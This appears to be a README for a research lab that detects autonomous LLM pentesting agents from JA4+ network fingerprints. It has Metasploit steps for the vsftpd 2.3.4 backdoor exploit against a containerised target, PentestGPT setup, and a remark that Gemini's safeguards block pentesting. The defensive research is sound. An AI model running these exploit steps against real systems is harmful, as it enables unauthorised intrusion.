# artificial-intrusion-detection
Passive Identification of Autonomous LLM Agents via JA4+ Network Fingerprinting and Machine Learning

## Exploit instructions

1. Spin up the containers
``` terminal
docker compose up -d
```

2. Start tshark from a separate terminal
``` terminal
docker exec -it attacker tshark -i eth0 -w /root/pcaps/<your-pcap-name> > /dev/null 2>&1 &
```

3. Drop into the attacker node
``` terminal
docker exec -it attacker bash
msfconsole -q
```

4. On the attacker node, configure your exploit
``` terminal
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.10
set LHOST 10.10.10.20
exploit
```

5. Finish exploiting and exit
``` terminal
exit
exit
pkill tshark
```

6. If analyzing the pcap, change ownership from root
``` terminal
sudo chown $USER:$USER pcaps/<your-pcap-file>
```

## PentestGPT setup instructions

On linux this workflow yielded a usable installation:
``` terminal
python -m venv /home/$USER/code/py-venv/pentest
source /home/$USER/code/py-venv/pentest
pip3 install git+https://github.com/GreyDGL/PentestGPT
export GEMINI_API_KEY=<your-api-key>
pentestgpt-legacy --reasoning-model gemini-3.5-flash --parsing-model gemini-3.5-flash
```
However, the Gemini model is too guardrailed to be used for pentesting.

## JA4+ analysis pipeline installation
Set up a separate virtual environment for generating JA4 fingerprints from our pcaps
``` terminal
python -m venv /home/hugin/code/py-venv/ja4analyze
source /home/hugin/code/py-venv/ja4analyze/bin/activate
pip install ja4plus
```

